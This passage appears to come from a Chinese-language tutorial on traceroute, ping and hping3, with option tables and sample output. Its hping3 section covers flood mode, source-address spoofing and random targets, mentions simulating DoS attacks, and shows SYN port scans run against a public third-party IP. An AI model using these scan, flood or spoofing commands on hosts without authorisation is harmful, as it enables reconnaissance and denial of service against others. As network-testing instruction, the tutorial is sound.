</span></span><span class="line"><span class="cl"> <span class="m">3</span>  10.196.18.109 <span class="o">(</span>10.196.18.109<span class="o">)</span>  0.866 ms 10.196.18.125 <span class="o">(</span>10.196.18.125<span class="o">)</span>  1.085 ms *
</span></span><span class="line"><span class="cl"> <span class="m">4</span>  10.162.33.5 <span class="o">(</span>10.162.33.5<span class="o">)</span>  1.297 ms 10.200.16.169 <span class="o">(</span>10.200.16.169<span class="o">)</span>  0.774 ms 10.196.92.109 <span class="o">(</span>10.196.92.109<span class="o">)</span>  1.218 ms
</span></span><span class="line"><span class="cl"> <span class="m">5</span>  10.162.32.145 <span class="o">(</span>10.162.32.145<span class="o">)</span>  1.539 ms  1.431 ms 10.162.32.149 <span class="o">(</span>10.162.32.149<span class="o">)</span>  1.310 ms
</span></span><span class="line"><span class="cl"> <span class="m">6</span>  * * *
</span></span><span class="line"><span class="cl"> <span class="m">7</span>  58.63.249.45 <span class="o">(</span>58.63.249.45<span class="o">)</span>  7.320 ms * 121.14.50.25 <span class="o">(</span>121.14.50.25<span class="o">)</span>  7.859 ms
</span></span><span class="line"><span class="cl"> <span class="m">8</span>  * * 113.96.4.121 <span class="o">(</span>113.96.4.121<span class="o">)</span>  4.887 ms
</span></span><span class="line"><span class="cl"> <span class="m">9</span>  202.97.22.149 <span class="o">(</span>202.97.22.149<span class="o">)</span>  32.481 ms 202.97.22.153 <span class="o">(</span>202.97.22.153<span class="o">)</span>  32.676 ms
</span></span><span class="line"><span class="cl"><span class="m">10</span>  36.110.245.206 <span class="o">(</span>36.110.245.206<span class="o">)</span>  36.928 ms 36.110.247.54 <span class="o">(</span>36.110.247.54<span class="o">)</span>  37.593 ms 36.110.245.82 <span class="o">(</span>36.110.245.82<span class="o">)</span>  41.254 ms
</span></span><span class="line"><span class="cl"><span class="m">11</span>  36.110.245.161 <span class="o">(</span>36.110.245.161<span class="o">)</span>  33.749 ms *  37.905 ms
</span></span><span class="line"><span class="cl"><span class="m">12</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">13</span>  * * 220.181.182.170 <span class="o">(</span>220.181.182.170<span class="o">)</span>  42.998 ms
</span></span><span class="line"><span class="cl"><span class="m">14</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">15</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">16</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">17</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">18</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">19</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">20</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">21</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">22</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">23</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">24</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">25</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">26</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">27</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">28</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">29</span>  * * *
</span></span><span class="line"><span class="cl"><span class="m">30</span>  * * *
</span></span></code></pre></td></tr></table>
</div>
</div><p>第一行显示要访问的主机名和ip、traceroute将尝试到主机的最大跃点数以及要发送的字节数据包的大小。</p>
<p>每行列出到达目的地的一个跳跃点。给出主机名与主机名的ip，然后是数据包到达主机并返回发起计算机所需的时间。默认情况下，<code>traceroute</code> 为每个主机发送三个数据包，因此列出了三个响应时间。</p>
<p>星号 <code>*</code> 表示丢失的数据包。这意味着网络中断、大量流量导致网络拥塞或防火墙丢弃流量。</p>
<h3 id="追踪ipv6协议">追踪IPv6协议</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">traceroute -6 ipv6.google.com
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="忽略主机名与ip的映射">忽略主机名与IP的映射</h3>
<p>使用-n选项在traceroute中禁用IP地址映射。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">traceroute -n qq.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">traceroute to qq.com <span class="o">(</span>183.3.226.35<span class="o">)</span>, <span class="m">30</span> hops max, <span class="m">60</span> byte packets
</span></span><span class="line"><span class="cl"> <span class="m">1</span>  9.31.61.129  0.908 ms  1.159 ms  1.537 ms
</span></span><span class="line"><span class="cl"> <span class="m">2</span>  9.31.122.210  1.061 ms  0.837 ms  1.421 ms
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="设置相应等待时间">设置相应等待时间</h3>
<p>使用 <code>-w </code> 选项在<code>traceroute</code> 中配置响应等待时间，支持指定等待对探测的响应的时间（秒为单位）。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">traceroute -w <span class="m">1</span> -n qq.com
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用特定的网络接口">使用特定的网络接口</h3>
<p>使用-i选项设置traceroute应使用的网络接口，如果未设置，则根据路由表选择接口。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">traceroute -w <span class="m">1</span> -n -i eth0 qq.com
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ping">ping</h2>
<p>Ping是一种简单、广泛使用的跨平台网络工具，用于测试主机是否可以在Internet协议（IP）网络上访问。它的工作原理是向目标主机发送网络控制消息协议<strong>Internet Control Message Protocol</strong> (<strong>ICMP</strong>) <strong>ECHO_REQUEST</strong>，目标节点等待并回复 <strong>ECHO_RESPONSE</strong>。</p>
<p>可以使用<code>ping</code> 测试两节点间的网络通信，可以做到：</p>
<ul>
<li>目标主机是否可用，</li>
<li>测量数据包到达目标主机并返回计算机所需的时间（与目标主机通信的往返时间（rtt）），以及数据包丢失的百分比。</li>
</ul>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>iputils-ping</code>  ；<code>apt install iputils-ping</code></li>
<li>CentOS/Fedora: <code>iputils</code> ；<code>yum install -y iputils</code></li>
<li>Apline：<code>iputils </code> ；<code>apk add iputils</code></li>
</ul>
</blockquote>
<p>使用参数</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-c</td>
<td>指定发送<strong>ECHO_REQUEST</strong>的请求数</td>
</tr>
<tr>
<td style="text-align:center">-i</td>
<td>设置包与包之间的间隔 <code>ping -i 3 -c 5 www.google.com</code></td>
</tr>
<tr>
<td style="text-align:center">-f</td>
<td>flood ping，检测高负载下的响应，需要有root权限</td>
</tr>
<tr>
<td style="text-align:center">-b</td>
<td>允许ping一个广播地址</td>
</tr>
<tr>
<td style="text-align:center">-t</td>
<td>限制ping遍历的网络跳跃数（TTL <strong>Time-to-live</strong>），收到数据包的每个路由器从计数中至少减去 1，如果大于 0，路由器会将数据包转发到下一跳，否则它会丢弃它并将 ICMP 响应返回。</td>
</tr>
<tr>
<td style="text-align:center">-s</td>
<td>设置ping时的数据包大小（单位 bytes），这将导致提供的总数据包大小加上ICMP头的8个额外字节。</td>
</tr>
<tr>
<td style="text-align:center">-l</td>
<td>发送预加载数据包（先发不等待回复的数据包），大于3需要root权限</td>
</tr>
<tr>
<td style="text-align:center">-W</td>
<td>设置等待相应时间，单位秒</td>
</tr>
<tr>
<td style="text-align:center">-w</td>
<td>设置超时时间，超时退出，单位秒</td>
</tr>
<tr>
<td style="text-align:center">-d</td>
<td>debug模式</td>
</tr>
<tr>
<td style="text-align:center">-v</td>
<td>显示详细输出</td>
</tr>
<tr>
<td style="text-align:center">-A</td>
<td>更快的在两节点间包往返的时间，非特权用户最小为200ms</td>
</tr>
</tbody>
</table>
<h2 id="hping">hping</h2>
<p>hping一个具有可嵌入tcl脚本功能的 <code>TCP/IP</code>包伪造工具。，主要用于创建或生成网络数据包以测试网络、服务或系统性能。 hping 是由不同实体开发的旧工具，并以 <code>hping2</code> 或 <code>hping3</code> 等新版本命名。 在大多数情况下，您可以使用操作系统提供的命令，可以是 hping 或 hping2 或 hping3。 hping 名称源自 ping 命令名称。<code>hping3</code> 是另一种用于扫描网络的工具。它在kali linux中默认是DOS攻击软件之一。</p>
<p>hping支持TCP、UDP、ICMP、raw-IP等协议用于不同的用例。通过使用hping，可以创建具有不同选项的不同协议包。hping主要可以用作。</p>
<ul>
<li>创建原始IP数据包</li>
<li>生成指定数量的数据包</li>
<li>设置包发送间隔</li>
<li>指定传输网络接口</li>
<li>创建和生成TCP数据包</li>
<li>创建和生成UDP数据包</li>
<li>创建和生成IP数据包</li>
<li>创建和生成ICMP数据包</li>
<li>设置MTU值</li>
<li>设置碎片并创建碎片或未碎片的数据包</li>
<li>设置数据包的有效负载或数据大小</li>
</ul>
<p>hping的常用场景</p>
<ul>
<li>模拟DOS和DDOS攻击</li>
<li>测试防火墙和TCP、UDP、IP等协议的防火墙配置</li>
<li>TCP和UDP端口扫描</li>
<li>测试网络设备的配置，如碎片、MTU等。</li>
<li>用于列出中间主机的高级跟踪路由</li>
<li>远程操作系统指纹识别和检测</li>
<li>远程正常运行时间决策</li>
<li>TCP/IP协议实现与栈测试审计</li>
</ul>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>hping3</code>  ；<code>apt install hping3</code></li>
<li>CentOS/Fedora: <code>hping3</code> ；<code>yum install epel-release &amp;&amp; yum install -y hping3</code></li>
<li>Apline：<code>hping3 </code> ；<code>apk add hping3 --update-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing</code></li>
</ul>
</blockquote>
<h3 id="参数说明">参数说明</h3>
<p><strong>基础参数</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">参数选项</th>
<th style="text-align:left">参数说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>-c --count [count]</code></td>
<td style="text-align:left">发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑</td>
</tr>
<tr>
<td style="text-align:left"><code>-i --interval  </code></td>
<td style="text-align:left">每个包发送间隔时间(单位是毫秒) 缺省时间是1秒,此功能在增加传输率上很重要。<br> <code>-i 1  </code>  为1s  <br><code>-i u1</code> 为1us （微秒） 即每秒发送1000000包</td>
</tr>
<tr>
<td style="text-align:left"><code>--fast</code></td>
<td style="text-align:left">为 <code> -i u10000</code> 的别名，即1秒发送10个包</td>
</tr>
<tr>
<td style="text-align:left"><code>--faster</code></td>
<td style="text-align:left">为 <code>-i u1</code> 的别名，但实际上发送的包取决于计算机的速度</td>
</tr>
<tr>
<td style="text-align:left"><code> --flood</code></td>
<td style="text-align:left">尽可能快速的发送包，不关注收到的恢复，要比 <code>-i u0</code> 快</td>
</tr>
<tr>
<td style="text-align:left"><code>-I --interface [interface name]</code></td>
<td style="text-align:left">指定默认的路由接口，在linux中，hping3使用默认路由接口。<br/>可以使用 <code>-I</code> 接网络接口的完整名称，如 <code>eth0</code></td>
</tr>
<tr>
<td style="text-align:left"><code>-q -quiet </code></td>
<td style="text-align:left">安静输出。除了启动时和完成时的摘要信息外，不输出任何内容。</td>
</tr>
<tr>
<td style="text-align:left"><code>-n -nmeric</code></td>
<td style="text-align:left">数字化输出主机地址</td>
</tr>
</tbody>
</table>
<p><strong>协议选项</strong></p>
<p>默认情况下，hping使用的为tcp协议</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-0 --rawip</code></td>
<td>原始IP模式，此模式下，hping3将发送IP头。</td>
</tr>
<tr>
<td><code>-1 --icmp</code></td>
<td>ICMP模式，默认情况下hping3将发送ICMP回显请求。</td>
</tr>
<tr>
<td><code>-2 --udp</code></td>
<td>UDP模式，默认情况下，hping3将向目标主机的0端口发送UDP</td>
</tr>
<tr>
<td><code>-8 --scan</code></td>
<td>端口扫描，在该模式下，需要提供一组端口，如 <code>1,2,3</code> 端口组以 <code>,</code> 分隔<br>端口范围：<code>start-end</code>  如 <code>1000-2000</code> <br>特殊字符：<code>all</code> 表示所有端口；<code>know</code> ：包含 <code>/etc/services</code> 中的所有端口<br>组合写法：<code>hping --scan 1-1000,8888,known -S www.baidu.com</code></td>
</tr>
<tr>
<td><code> -9 --listen signature</code></td>
<td>监听模式，此模式下 <code>hping3</code>  等待包含签名的数据包并从签名端转储到数据包的结尾处。</td>
</tr>
</tbody>
</table>
<p><strong>IP相关选项</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-a --spoof hostname</code></td>
<td>此选项可以伪造源IP地址，可确保目标不会获得真实IP地址，必然性的响应将被发送到伪造的地址处。</td>
</tr>
<tr>
<td><code>--rand-source</code></td>
<td>此选项开启随机源模式。hping将发送带有随机源地址的数据包。</td>
</tr>
<tr>
<td><code>--rand-dest</code></td>
<td>此选项开启随机目标模式。hping将数据包发送到随机目标地址<br/>如，当使用随机目标地址时，可以使用<code>x</code> 作为范围，所有出现的 <code>x</code> 都将呗替换为0-255之间的随机数。如<code>10.0.0.x</code>。可以使用<code>--debug</code> 选项查看生成的随机地址。<br/>注意：使用此选项，hping无法检测数据包的正确传出接口，应使用 <code>-I </code>选项指定网络接口。</td>
</tr>
<tr>
<td><code>-t --ttl</code></td>
<td>此选项可以设置传出数据包的TTL（生存时间）</td>
</tr>
<tr>
<td><code>-N id</code></td>
<td>设置IP字段的随机值</td>
</tr>
<tr>
<td><code>-H --ipproto</code></td>
<td>在RAW IP模式中设置IP协议</td>
</tr>
<tr>
<td><code> -r --rel</code></td>
<td>ip id等增量</td>
</tr>
<tr>
<td><code>-m –mtu</code></td>
<td>设置虚拟最大传输单元</td>
</tr>
</tbody>
</table>
<p><strong>icmp选项</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-C --icmptype type</code></td>
<td>设置icmp类型，默认为icmp echo reques。</td>
</tr>
<tr>
<td><code>--icmp-ipver</code></td>
<td>设设置包含在ICMP数据中的IP头的IP版本，默认值为4。</td>
</tr>
<tr>
<td><code>--icmp-ipproto</code></td>
<td>设置包含在ICMP数据中的IP头的IP协议，默认为TCP。</td>
</tr>
</tbody>
</table>
<p><strong>TCP/UDP选项</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-s --baseport [src port]</code></td>
<td>随机源端口</td>
</tr>
<tr>
<td><code>-p --destport [dest port]</code></td>
<td>设置目标端口<br><code>+</code> 目标端口将随着收到的每个回复而增加<br><code>++</code> 目标端口每发送数据包都会增加</td>
</tr>
<tr>
<td>&ndash;keep</td>
<td>保持源端口不边</td>
</tr>
<tr>
<td>-w &ndash;win</td>
<td>设置tcp窗口大小，默认64</td>
</tr>
<tr>
<td>-F &ndash;fin</td>
<td>设置 tcp fin标记</td>
</tr>
<tr>
<td>-S &ndash;syn</td>
<td>设置 tcp SYN标记</td>
</tr>
<tr>
<td>-R &ndash;rst</td>
<td>设置 tcp rst标记</td>
</tr>
<tr>
<td>-P &ndash;push</td>
<td>设置 tcp PUSH标记</td>
</tr>
<tr>
<td>-A &ndash;ack</td>
<td>设置 tcp ACK标记</td>
</tr>
<tr>
<td>-U &ndash;urg</td>
<td>设置 tcp URG标记</td>
</tr>
<tr>
<td>-X &ndash;xmas</td>
<td>设置 tcp Xmas标记</td>
</tr>
<tr>
<td>-Y &ndash;ymas</td>
<td>设置 tcp Ymas标记</td>
</tr>
</tbody>
</table>
<p><strong>常用参数</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-d --data</code></td>
<td>设置数据包主体大小。 <code>使用 --data 40</code> hping将在 protocol_header 增加40 字节。</td>
</tr>
<tr>
<td><code>-E --file [filename]</code></td>
<td>使用文件名内容填充数据包的数据</td>
</tr>
<tr>
<td><code> -j --dump</code></td>
<td>以16进制导出数据包</td>
</tr>
<tr>
<td><code>-J --print</code></td>
<td>导出可打印的数据包</td>
</tr>
<tr>
<td><code>-u --end</code></td>
<td>如果使用 ``&ndash;file filename` 选项，何时为EOF。</td>
</tr>
<tr>
<td><code>-T --traceroute</code></td>
<td>traceroute 模式。此选项将在接收ttl来尝试追踪。</td>
</tr>
<tr>
<td><code>--tr-keep-ttl</code></td>
<td>保持ttl的固定，用于监视某一跳</td>
</tr>
<tr>
<td><code>–tr-stop</code></td>
<td>traceroute 下收到第一个不是ICMP时退出</td>
</tr>
<tr>
<td>&hellip;.</td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>输出格式</strong></p>
<p>hping的一个标准的TCP/UDP格式如下，UDP字段含义与TCP的相同。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># tcp</span>
</span></span><span class="line"><span class="cl"><span class="nv">len</span><span class="o">=</span><span class="m">46</span> <span class="nv">ip</span><span class="o">=</span>192.168.1.1 <span class="nv">flags</span><span class="o">=</span>RA DF <span class="nv">seq</span><span class="o">=</span><span class="m">0</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">255</span> <span class="nv">id</span><span class="o">=</span><span class="m">0</span> <span class="nv">win</span><span class="o">=</span><span class="m">0</span> <span class="nv">rtt</span><span class="o">=</span>0.4 ms
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># udp</span>
</span></span><span class="line"><span class="cl"><span class="nv">len</span><span class="o">=</span><span class="m">46</span> <span class="nv">ip</span><span class="o">=</span>192.168.1.1 <span class="nv">seq</span><span class="o">=</span><span class="m">0</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">id</span><span class="o">=</span><span class="m">0</span> <span class="nv">rtt</span><span class="o">=</span>6.0 ms
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>len：len是从数据链路层捕获的数据的大小（字节），不包括数据链路头大小。</li>
<li>ip：  ip 为请求的ip</li>
<li>flags：flags为TCP的标记，如
<ul>
<li>R  RESET</li>
<li>S SYN</li>
<li>A  ACK</li>
<li>F FIN</li>
<li>P PUSH</li>
<li>U URGENT</li>
<li>X 不标准的 0x40</li>
<li>Y 不标准的 0x80</li>
</ul>
</li>
<li>seq：seq是数据包的序列号，使用TCP/UDP数据包的源端口获得</li>
<li>id  是IP ID字段。</li>
<li>win  TCP 窗口大小</li>
<li>rtt   往返时间 （round trip time），单位毫秒</li>
<li>以下是使用-V参数后的字段
<ul>
<li>tos 是IP标头的服务类型字段。</li>
<li>iplen ip的总长度</li>
<li>seq 和 ack 是TCP标头中的序列号和32位确认号</li>
<li>是TCP标头校验和值。</li>
<li>urp TCP紧急指针值。</li>
</ul>
</li>
</ul>
<p><strong>ICMP的输出格式</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ICMP Port Unreachable from <span class="nv">ip</span><span class="o">=</span>192.168.1.1 <span class="nv">name</span><span class="o">=</span>nano.marmoc.net
</span></span></code></pre></td></tr></table>
</div>
</div><p>在此格式中，ip 为 ICMP 错误的 IP 地址，name为解析的名称或者为UNKNOWN，而其他的参数含义与TCP/UDP大致相同。</p>
<h3 id="端口扫描">端口扫描</h3>
<p>hping可以自由地创建原始IP、TCP、UDP和ICMP数据包。可以利用此功能生成 <code>TCP SYN</code> 扫描。<code>TCP-SYN</code> 扫描是最简单的将数据包发送到主机/IP端口的方法。这里 扫描的为<code>110.242.68.4:80</code></p>
<p>启动经典的扫描的最简单方法是将TCP-SYN数据包发送到主机/ip上的端口。下面的命令将扫描IP 192.168.8.223上的端口80。从输出中，可以看到 <code>flags=SA</code> SYN和ACK标记，代表一个开放端口。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 -S 110.242.68.4 -p <span class="m">80</span> -c <span class="m">2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>扫描一个范围的端口可以使用 <code>++</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 -S 110.242.68.4 -p ++80
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以使用如下方式</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 -8 80-86 -S 110.242.68.4 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Scanning 110.242.68.4 <span class="o">(</span>110.242.68.4<span class="o">)</span>, port 80-86
</span></span><span class="line"><span class="cl"><span class="m">7</span> ports to scan, use -V to see all the replies
</span></span><span class="line"><span class="cl">+----+-----------+---------+---+-----+-----+-----+
</span></span><span class="line"><span class="cl"><span class="p">|</span>port<span class="p">|</span> serv name <span class="p">|</span>  flags  <span class="p">|</span>ttl<span class="p">|</span> id  <span class="p">|</span> win <span class="p">|</span> len <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----+-----------+---------+---+-----+-----+-----+
</span></span><span class="line"><span class="cl">   <span class="m">80</span> http       : .S..A... <span class="m">128</span> <span class="m">60936</span> <span class="m">64240</span>    <span class="m">46</span>
</span></span><span class="line"><span class="cl">All replies received. Done.
</span></span><span class="line"><span class="cl">Not responding ports: <span class="o">(</span><span class="m">81</span> <span class="o">)</span> <span class="o">(</span><span class="m">82</span> xfer<span class="o">)</span> <span class="o">(</span><span class="m">83</span> mit-ml-dev<span class="o">)</span> <span class="o">(</span><span class="m">84</span> ctf<span class="o">)</span> <span class="o">(</span><span class="m">85</span> <span class="o">)</span> <span class="o">(</span><span class="m">86</span> mfcobol<span class="o">)</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="通过hping3跟踪路由到指定端口">通过Hping3跟踪路由到指定端口：</h3>
<p>hping3支持一个很实用功能，可以追踪路由到一个指出的端口，查看你的数据包被阻塞的地方。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 --traceroute -p <span class="m">80</span> -V -1 www.google.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">using eth0, addr: 195.133.11.43, MTU: <span class="m">1500</span>
</span></span><span class="line"><span class="cl">HPING www.google.com <span class="o">(</span>eth0 142.250.150.104<span class="o">)</span>: icmp mode set, <span class="m">28</span> headers + <span class="m">0</span> data bytes
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">1</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>195.133.10.1 <span class="nv">name</span><span class="o">=</span>gateway   
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">1</span> <span class="nv">hoprtt</span><span class="o">=</span>3.1 ms
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">2</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>10.11.12.37 <span class="nv">name</span><span class="o">=</span>UNKNOWN   
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">2</span> <span class="nv">hoprtt</span><span class="o">=</span>10.0 ms
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">3</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>62.140.243.62 <span class="nv">name</span><span class="o">=</span>msk-m9-b1-ae30-vlan449.fiord.net
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">3</span> <span class="nv">hoprtt</span><span class="o">=</span>1.9 ms
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">4</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>62.140.239.113 <span class="nv">name</span><span class="o">=</span>msk-m9-b6-ae1-vlan12.fiord.net
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">4</span> <span class="nv">hoprtt</span><span class="o">=</span>9.8 ms
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">5</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>72.14.222.198 <span class="nv">name</span><span class="o">=</span>UNKNOWN   
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">5</span> <span class="nv">hoprtt</span><span class="o">=</span>4.2 ms
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">6</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>108.170.250.33 <span class="nv">name</span><span class="o">=</span>UNKNOWN   
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">6</span> <span class="nv">hoprtt</span><span class="o">=</span>3.8 ms
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">7</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>108.170.250.51 <span class="nv">name</span><span class="o">=</span>UNKNOWN   
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">7</span> <span class="nv">hoprtt</span><span class="o">=</span>2.5 ms
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">8</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>142.251.49.158 <span class="nv">name</span><span class="o">=</span>UNKNOWN   
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">8</span> <span class="nv">hoprtt</span><span class="o">=</span>34.7 ms
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">9</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>108.170.235.204 <span class="nv">name</span><span class="o">=</span>UNKNOWN   
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">9</span> <span class="nv">hoprtt</span><span class="o">=</span>18.2 ms
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">10</span> TTL <span class="m">0</span> during transit from <span class="nv">ip</span><span class="o">=</span>142.250.209.35 <span class="nv">name</span><span class="o">=</span>UNKNOWN   
</span></span><span class="line"><span class="cl"><span class="nv">hop</span><span class="o">=</span><span class="m">10</span> <span class="nv">hoprtt</span><span class="o">=</span>17.1 ms
</span></span><span class="line"><span class="cl">....
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="不同类型的icmp">不同类型的ICMP</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
